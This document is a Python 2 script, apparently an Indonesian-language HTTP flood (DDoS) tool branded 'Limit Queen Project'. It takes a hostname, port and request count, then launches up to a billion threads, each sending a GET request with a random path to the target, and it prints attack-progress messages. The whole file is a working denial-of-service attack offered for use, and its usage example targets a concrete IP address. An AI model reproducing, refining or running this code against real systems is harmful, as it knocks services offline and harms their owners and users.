

import random
import socket
import string 
import sys
import threading
import time
 


print ("\33[31;1m  _____       _____        ______      ________   ")
time.sleep(0.15)
print ("\33[31;1m | ___ +,    | ___ +,    /  ____  \   |  ______|  ")
time.sleep(0.15)
print ("\33[31;1m ||   \ ++   ||   \ ++  |  |    |  |  | |______   ") 
time.sleep(0.15)
print ("\33[31;1m ||    | +   ||    | +  |  |    |  |  |_______ |  ")     
time.sleep(0.15)
print ("\33[31;1m ||___/ ++   ||___/ ++  |  |____|  |   ______| |  ")
time.sleep(0.15)
print ("\33[31;1m |_____+'    |_____+'    \________/   |________|  ")
time.sleep(0.15)

print("\33[1;33mTOOLS NYA UDAH GILE")

print ('''
\33[36;1m
     _        _ _ _ _        __                                        
   /  /      /   _   \     /  _ \              
  /  /imit  /  /  /  /    /  /_| |               
 /  /_ _   /  /_ /  /ueen/  _ _ /                              
/_ _ _ _/  \_ _ ,',_\   /_ /roject  

| Ig       ; royazizbarera1                        |
| Github   ; https://gihtub.com/LimitQueenProject/ |
| YouTube  ; Limit Queen Project                   |
| Author   ; Roy gans                              |
| Biar bisa di pake harus subs dulu:v              |
''')
time.sleep(0.3)

       
# parse input

host = " "
ip = " "
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 1000000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 1000000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print ("ERROR BOY\n Gunakan: " + sys.argv[0] + " < Hostname > < Port > < JUMLAH SERANGAN BOY > ")
    print ("\n \33[31;1mContoh: python ddos.py 178.128.23.56 80 999999, \33[33;1m178.128.23.56 ini ip, 80 itu port, 999999 itu paket yang di kirim, lebih banyak lebih bagus")
    print ("\33[37;1m")
    sys.exit(1)
    
    
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", " ").replace("www.", " ")
    ip = socket.gethostbyname(host)
except socket.gaieror:
    print " ERROR BOY\n Pastikan Anda Memasukan Website Yang Benar Boy "
    sys.exit(2)
    
    
thread_num = 0
thread_num_mutex = threading.Lock()



def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    
    thread_num += 1
    print( " \n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] = #.#.#.#.# Serangan Sedang Di Lakukan.#.#.#.#")
    
    thread_num_mutex.release()
    
    
    
def generate_url_path():
    msg = str(string.letters + string.digits + string.punctuation)
    data = " ".join(random.sample(msg, 5))
    return data
    
def attack():
    print_status()
    url_path = generate_url_path()
    
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        dos.connect((ip, port))
        
        dos.send("GET /%s HTTP/1.1\nHOST: %s\n\n" % (url_path, host))
    except socket.error, e:
        print ("\n [Tidak Ada Koneksi Atau Server Kemungkinan DOWN]: " + str(e))
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()
        
        
print ("[#] Attack Started on " + host + " (" + ip + ") || Port: " + str(port) + " || #Requests: " + str(num_requests))

all_threads = []

for i in xrange(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()
print ("\33[37;1m")    
